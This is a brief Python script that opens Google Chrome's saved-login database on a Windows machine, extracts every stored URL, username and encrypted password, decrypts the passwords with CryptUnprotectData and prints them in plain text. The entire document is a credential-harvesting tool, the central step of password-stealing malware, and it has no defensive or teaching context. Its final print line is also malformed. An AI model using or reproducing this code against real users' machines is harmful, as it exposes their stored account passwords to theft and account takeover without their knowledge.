import sqlite3, win32crypt, os

# find the chrome path storing user logins
userdir = os.path.expanduser("~")
chromepath = os.path.join(userdir, "Appdata", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")

print(chromepath)

# connect the sql database
conn = sqlite3.connect(chromepath)
c = conn.cursor()

# perform a sql query to return username and password data
c.execute("SELECT origin_url, username_value, password_value FROM logins;")

# print them to console
login_data = c.fetchall()
for URL, username, password in login_data:
    pswd = win32crypt.CryptUnprotectData(password)
    print("%s %s %s") % (URL, username, pswd)